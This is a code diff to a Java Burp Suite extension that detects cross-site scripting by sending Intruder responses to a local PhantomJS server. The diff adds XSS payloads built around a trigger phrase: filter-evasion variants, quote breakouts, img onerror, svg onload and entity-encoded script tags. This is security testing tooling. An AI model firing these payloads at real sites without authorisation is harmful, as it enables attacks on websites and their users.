@@ -42,14 +42,15 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
     private static String phantomServer = "http://127.0.0.1:8093";
     
     private static String triggerPhrase = "f7sdgfjFpoG";
+    private static String grepPhrase = "fy7sdufsuidfhuisdf";
     
     public JPanel mainPanel, serverConfig;
-    public JTextField phantomURL;
+    public JTextField phantomURL, grepVal;
     public JTabbedPane tabbedPane;
     public JButton btnAddText,btnSaveTabAsTemplate,btnRemoveTab;
 	
     /**
-     * Initial Payloads containing trigger phrase, f7sdgfjFpoG.
+     * Initial Payloads containing trigger phrase. 
      * 
      * The phantom server is designed to report XSS only if the
      * function calls contain the trigger phrase, suggesting
@@ -61,18 +62,36 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 		("<script>alert('" + triggerPhrase + "')</script>").getBytes(),
 		("<scr ipt>alert('" + triggerPhrase + "')</scr ipt>").getBytes(),
 		("\"><script>alert('" + triggerPhrase + "')</script>").getBytes(),
+		("\"><script>alert('" + triggerPhrase + "')</script><\"").getBytes(),
 		("'><script>alert('" + triggerPhrase + "')</script>").getBytes(),
+		("'><script>alert('" + triggerPhrase + "')</script><'").getBytes(),
 		("<SCRIPT>alert('" + triggerPhrase + "');</SCRIPT>").getBytes(),
 		("<scri<script>pt>alert('" + triggerPhrase + "');</scr</script>ipt>").getBytes(),
 		("<SCRI<script>PT>alert('" + triggerPhrase + "');</SCR</script>IPT>").getBytes(),
 		("<scri<scr<script>ipt>pt>alert('" + triggerPhrase + "');</scr</sc</script>ript>ipt>").getBytes(),
 		("\";alert('" + triggerPhrase + "');\"").getBytes(),
+		("';alert('" + triggerPhrase + "');'").getBytes(),
+		(";alert('" + triggerPhrase + "');").getBytes(),
 		("<SCR%00IPT>alert(\\\"" + triggerPhrase + "\\\")</SCR%00IPT>").getBytes(),
 		("<SCRIPT>a=/" + triggerPhrase + "/").getBytes(),
 		("\\\";alert('" + triggerPhrase + "');//").getBytes(),
 		("<STYLE TYPE=\"text/javascript\">alert('" + triggerPhrase + "');</STYLE>").getBytes(),
+		("<scr\nipt>alert('" + triggerPhrase + "')</scr\nipt>").getBytes(),
+		("<scr\nipt>alert('" + triggerPhrase + "')</scr\nipt>").getBytes(),
+		("<<SCRIPT>alert('" + triggerPhrase + "')//<</SCRIPT>").getBytes(),	
     };
 	
+    // These payloads don't work in webkit, but may in slimer
+    public static final byte[][] NONPAYLOADS = {
+    	("<img src=x onerror=alert('" + triggerPhrase + "')>").getBytes(),
+		// Needs to be further tested -- may only work in slimer
+		("<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert('" + triggerPhrase + "')></g></svg>").getBytes(),
+		// This may break things too, need to test
+		("&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;" + triggerPhrase + "&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;").getBytes()
+		// The following should be working, but it's not. On a plane and can't look at documentation
+		// Base64.encodeBase64("<script>alert('" + triggerPhrase + "')</script>")
+    };
+    
 	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
 		mCallbacks = callbacks;
 		
@@ -85,6 +104,8 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 		callbacks.registerIntruderPayloadProcessor(this);
 		callbacks.registerHttpListener(this);
 		
+		// Handle all the GUI stuff.
+		// This should probably be moved to a separate class
 		SwingUtilities.invokeLater(new Runnable(){
         	@Override
         	public void run(){
@@ -95,12 +116,18 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
                 serverConfig.setPreferredSize(new Dimension(400, 400));
                 
                 phantomURL = new JTextField(20);
-                phantomURL.setText(phantomServer);
+                phantomURL.setText(phantomServer);	
+                
+                grepVal = new JTextField(20);
+                grepVal.setText(grepPhrase);
         	    
                 JLabel heading  = new JLabel("PhantomJS Server Settings");
+                JLabel grepHeading = new JLabel("Grep Phrase");
                 serverConfig.add(heading);
-                
                 serverConfig.add(phantomURL);
+                
+                serverConfig.add(grepHeading);
+                serverConfig.add(grepVal);
                 
                 mainPanel.add(serverConfig);
         		mCallbacks.customizeUiComponent(mainPanel);
@@ -164,6 +191,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
         	HttpPost PhantomJs = new HttpPost(phantomURL.getText());
         	
         	try {
+        		// Base64 encode the intruder response, then send to phantomJS
         		byte[] encodedBytes = Base64.encodeBase64(messageInfo.getResponse());
         		String encodedResponse = helpers.bytesToString(encodedBytes);
         		
@@ -172,6 +200,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
 	        	
 	        	PhantomJs.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
+	        	// Retrieve response from phantomJS and process
 	        	HttpResponse response = client.execute(PhantomJs);
 	        	String responseAsString = EntityUtils.toString(response.getEntity());
 	            
@@ -181,7 +210,7 @@ public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IIntrud
             	// the trigger phrase
 	            if(responseAsString.toLowerCase().contains(triggerPhrase.toLowerCase())) {
 	            	// Append weird string to identify XSS
-		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + "fy7sdufsuidfhuisdf";
+		            String newResponse = helpers.bytesToString(messageInfo.getResponse()) + grepVal.getText();
 	            	messageInfo.setResponse(helpers.stringToBytes(newResponse));
 	            	stdout.println("XSS Found");
 	            }
